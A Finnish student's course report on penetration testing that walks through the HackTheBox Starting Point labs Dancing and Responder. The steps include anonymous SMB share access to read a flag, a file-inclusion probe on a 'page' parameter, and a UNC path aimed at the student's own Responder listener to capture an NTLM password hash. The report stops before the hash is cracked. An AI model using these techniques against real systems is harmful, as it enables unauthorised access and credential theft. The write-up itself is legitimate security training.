# Kotitehtävät

Kotitehtävät ovat kurssilta "Tunkeutumistestaus - Penetration Testing course" ja löytyvät osoitteesta https://terokarvinen.com/tunkeutumistestaus/.

Kotitehtävät on tehty Windows 11 - Home - käyttöjärjestelmällä, päivitykset ajettu 04/05/2025 asti.

AMD Ryzen 5 4500U, RAM 8 Gt.

Aika: Itä-Euroopan normaaliaika Aikavyöhyke: Suomi (UTC+3) 04/05/2025 (pvm/kk/v)

Kaikissa testaukseen liittyvässä: Oracle VM VirtualBox ja Kali Linux Point release live image (2025.1a)

## x) Lue/katso ja tiivistä. (Tässä x-alakohdassa ei tarvitse tehdä testejä tietokoneella, vain lukeminen tai kuunteleminen ja tiivistelmä riittää. Tiivistämiseen riittää muutama ranskalainen viiva kustakin artikkelista. Kannattaa lisätä myös jokin oma ajatus, idea, huomio tai kysymys.)

### [Karvinen 2025: Start Your Research with a Review Article](https://terokarvinen.com/review-article/)

- Perusohje katsausartikkeleihin (JUFO). Joku siis on tutkinut kirjallisuutta ja kirjoittanut iiitä artikkelin
- Yksi hyvä paikka löytää on Google Scholar
- Haku aihe + sana "review", myös suodatin löytyy
- Artikkelit, joilla on luokitus 1,2 ja 3, on hyviä
- Linkki koko tekstiin PDF - muodossa yleensä hakutulosten oikealla puolella
- Asetukset -> Kirjastolinkit --> Lisää yliopisto


    Review. Etsi vapaavalintainen review eli katsausartikkeli, joka liittyy kurssin aiheisiin.
        Artikkelin pitää olla JUFO-arvioidusta julkaisusta eli jufo-taso 1, 2 tai 3.
        Mieluiten tuore, julkaisusta alle 2 vuotta.
        Artikkeleita löytyy scholar.google.com/ncr
        Jos artikkeli on pitkä, yli 4 sivua, voit perustaa tiivistelmäsi silmäilyyn, kunhan mainitset tästä tiivistelmässäsi.


## a) HTB Dancing. Ratkaise HackTheBox.com: Starting Point: Tier 0: Dancing.

> Tein sinne käyttäjän ja vinkkien mukaan yhdistän OpenVPN - kautta Kalista.
Eli siis HackTheBoxin sivuille -> Haluttuun labraan, siitä valitaan "OpenVPN" ja mennään ohjeiden mukaan
- Serveriksi vaihdoin Eu
- Pitää vielä selvitellä, ettei paketit leviä mihinkään
- Eli ladataan ovpn - tiedosto -> CLI ->  ```openvpn + tiedostopolku``` ja pari kertaa testattua, se heittää erroria, jos ei aja roottina, eli lisätään siihen vielä ```sudo openvpn + tiedostopolku/tiedosto```
- Starting - Point - labroja saa vapaasti jakaa [sääntöjen](https://app.hackthebox.com/rules) mukaan, joten siitä ei pelkoa

- Tässä meni aika paljon aikaa selvitellä, miten saan järkevästi tehtyä yhteyden vain ja ainoastaan HTB ja VPN välille ja niin, ettei paketit leviä muualle. Päädyin lopulta [tämän](https://www.linode.com/docs/guides/vpn-firewall-killswitch-for-linux-and-macos-clients/#vpn-firewall-using-iptables) ja ChatGPT:n avustuksella tekemään Firewall Killswitchin.
- Lopputuloksena tein scriptin, joka määrittää ufw - säännöt niin, että dns - kyselyt menevät vain HTB omalle palvelimelle ja liikenne kulkee ainoastaan tun0 - vpn - yhteyden kautta.
- Testasin vielä ja lopputuloksena mihinkään muualle ei saa yhteyttä, paitsi HTB.
- Sitä pystyy nyt ajamaan ```sudo ./ufw-vpn.sh``` aina tarvittaessa

![image](https://github.com/user-attachments/assets/41d13b4a-405f-4a1c-a43c-f0ba599244c7)


> Teen tästä muut alta pois ennen tuota tehtävää, jotta saan vähän pohjaa näiden suorittamiseen.
> Ekassa piti vastailla kysymyksiin, skannata portit ja ottaa telnet - yhteys roottikäyttäjällä, jonka jälkeen sai lipun
> Tokassa käyttää aukinaisena olevaa ftp - porttia ja hakea sieltä flägitiedosto


Vihdoin itse tehtävän pariin!

Eli VPN yhdistetty, Target Machine käynnissä ja aletaan hommiin!

Pari helppoa kyssäriä alta pois - eli SMB on Server Message Block ja sijaitsee portissa 445
Sit pitää porttiskannata ja löytää versio

Painin jo aikaisemmin tuon version löytämisen kanssa, joten komento oli helppo -> ```nmap -Pn -sV p445 <ip>``` ja tuon portin laitoin vain, koska tiedetään, missä se sijaitsee ja skannaus nopeutuu

![image](https://github.com/user-attachments/assets/e6a3fa9b-09ee-4b91-8681-12d850dc7e17)

- Sitten pitäisi ottaa smb - yhteys -> Asennetaan ```sudo apt-get install smbclient```
- Se ei mennyt läpi, joten vianselvitystä tässä tehnyt
- Huomasin, että olin avannut suoritusten välillä useamman vpn - yhteyden ja niistä tun1, tun2 avoinna. Ehkä siinä syy?
- Korjasin siis sen näin

```
ip a
sudo pkill openvpn
ip a
sudo ip link delete tun0
sudo ip link delete tun1
sudo ip link delete tun2
```
Ja yhdistin VPN uudestaan.

- Näytti olevan, sillä ensimmäistä kertaa meni pingi suorilta läpi

![image](https://github.com/user-attachments/assets/b02ca2a6-2c0e-4670-bbab-a1ce53dea556)

- Nyt vihdoin homma rullaa!

- Katsoin man smbclient komennon, joka listaa sharet -> ```smbclient -L <ip>```

![image](https://github.com/user-attachments/assets/633ebb84-931a-45e6-ac6e-d7e7df63cae9)

- Huomataan, että siellä on 4 eri kohtaa
- Löysin [täältä](https://www.computerhope.com/unix/smbclien.htm) komennon, jolla laitan ```smbclient //ip/ShareName```ja sillä pitäisi päästä sisään
- Tässä kysyttiin, että mihin pääsee ja vastauksena on itseasiassa kaksi kohtaa: IPC$ ja WorkShares
- Salasanana käy nähtävästi mikä vain (lähdin keulimaan ja syötin ls, meni läpi)
  
  ![image](https://github.com/user-attachments/assets/83829eed-3d2e-45b8-a37f-494f6df2d3e7)

![image](https://github.com/user-attachments/assets/74279c89-1af2-49b9-afa3-e0c292fdea93)

Sisältö oli tässä WorkSharessa mielenkiintoisempi. Huomataan, että siellä on 2 Directorya. James ja Amy. Navigoidaan niihin ja katsotaan sisältö.

![image](https://github.com/user-attachments/assets/85a7f01a-a059-4f45-8068-1c498f1d3332)

Sieltä löytyi Jamesilta flag.txt. Yritin käyttää ```get flag.txt ja get "flag.txt"```, mutta se ei antanut.
Löysin kuitenkin tähän [täältä](https://stackoverflow.com/questions/69887956/smbclient-vmware-linux-guest-and-windows-host-error-opening-local-file) vinkin, jolla saan sen auki.

Laitoin siis vain ```more flag.txt```ja lippu löytyi!

![image](https://github.com/user-attachments/assets/574e4ee3-f92c-4d23-ad8f-8fe803b50c18)

![image](https://github.com/user-attachments/assets/b0f5d781-1cd2-4c9e-a7fc-27bbe989b88b)

## b) HTB Responder. Ratkaise HackTheBox.com: Starting Point: Tier 1: Responder.

- Tässä syötetään ensin target - koneen IP - osoite hakukenttään ja saadaan ```unika.htb``` auki

![image](https://github.com/user-attachments/assets/d96e7358-75f6-4325-b812-633262046758)

Yritin myös curlata sitä, mutta siitä ei ollut hyötyä. Aloitan porttiskannauksen sille ja katsotaan, mitä se on syönyt. 

Sieltä löytyi portit 80/tcp -> http ja 5985/tcp -> wsman

![image](https://github.com/user-attachments/assets/a4a15097-f290-4104-b3f0-ebc36a48a938)

Hetken ihmettelin ja mietin, kunnes päätin palata takaisin curlin pariin. Muistaakseni sillä pywstyi saamaan jotain tietoja kaivettua enemmän. Tutkin manualia ja ```curl --help```, jonka jälkeen käytin komentoa ```curl -i -d -v http://10.129.102.98```. -i näyttää headerit, -d näyttää HTTP POST datan, -v selkeyttää

![image](https://github.com/user-attachments/assets/b8f689b6-d22a-4053-a2e8-95ad75f49999)

- Eli se pyörii Apache - palvelimen kautta, OpenSSL salauksella ja PHP scriptikielenä

- Pyörittelin aika pitkään seuraavaa vaihetta löytämättä ratkaisua, joten katsoin Walkthrough tästä ja siinä sanottiin, että /etc/hosts - tiedostoon laittaminen tekee sen, että IP - osoite vastaa sisältää aina Headerin, eli Host: unika.htb. Tehdään siis niin.

- Eli ```echo "ip unika.htb" | sudo tee -a /etc/hosts```

- Nähdään, että se on lisätty tiedostoon

![image](https://github.com/user-attachments/assets/91f3f0e7-7bb8-47cf-8d3b-87c4e7f64ce2)


![image](https://github.com/user-attachments/assets/2387184e-1f61-4182-89a6-d5cb6dc12b4d)

- Nyt, kun sivu päivitetään, nähdään oikea sivu

![image](https://github.com/user-attachments/assets/e0842c00-c946-4f02-b3ab-cee419244240)

- Jos kieli vaihdetaan, nähdään "page" olevan se parametri, jota tehtävässä haettiin

![image](https://github.com/user-attachments/assets/814a82ab-512b-43bd-a42d-111b5f475e12)

- Tässä ajattelin vain kokeilla lisätä nuo hyppyrimpsut page - parametrin perään ja se näytti tuottavan tulosta

![image](https://github.com/user-attachments/assets/4acb52bd-6947-4635-b28d-513927f12732)

Task 5 kysytään pääteltä olevaa esimerkkiparametria, johon vastaus on ```//10.10.14.6/somefile```

Task 6 vastaus [täältä](https://www.crowdstrike.com/en-us/cybersecurity-101/identity-protection/windows-ntlm/) haettuna on New Technology Lan Manager. Nopeasti luettuna se sisältää kasapäin haavoittuvuuksia ja tätä nykyä korvattu Kerberoksella

Task 7 vastaus löytyy ```responce --help```, eli ```-I```

Task 8 kussillakin käytetty John The Ripper

Aloitetaan siis kloonaamalla Responder työkalu

```git clone https://github.com/lgandx/Responder```

Tarkistetaan, että se kuuntelee SMB pyyntöjä

![image](https://github.com/user-attachments/assets/695779bf-3a81-4ccc-811b-0e77a8e23810)

Ajetaan Responder python3 ja laitetaan kuuntelemaan tun0

```
sudo python3 Responder.py -I tun0
```

Syöttämällä osoiteriville sen aikaisemman taskin vastauksen, eli ```//10.10.16.76/somefile```, saadaan Hash salasanalle

![image](https://github.com/user-attachments/assets/373e450c-3a37-4f60-96f6-10ef04a765f1)

Tämä varmaan pitäisi Johnilla availla. Tallensin hashin ```micro hash```ja copypastesin sen sisään. Nyt etsin vähän aikaisemmasta raportista, mitenn se tehtiin Johnilla.
## Lähteet

Linux smbclient command, Updated: 09/10/2024 by Computer Hope, Luettavissa: https://www.computerhope.com/unix/smbclien.htm, Luettu 06/05/2025



Smbclient - vmware LINUX guest and windows Host - error opening local file, answered Aug 11, 2022 at 10:06, JINX's, Luettavissa: JINXhttps://stackoverflow.com/questions/69887956/smbclient-vmware-linux-guest-and-windows-host-error-opening-local-file, Luettu 06/05/2025

Smbclient command, Mar 20, 2023, ibrahim atasoy, Luettavissa: https://medium.com/@ibo1916a/smbclient-command-2803de274e46, Luettu 06/05/2025

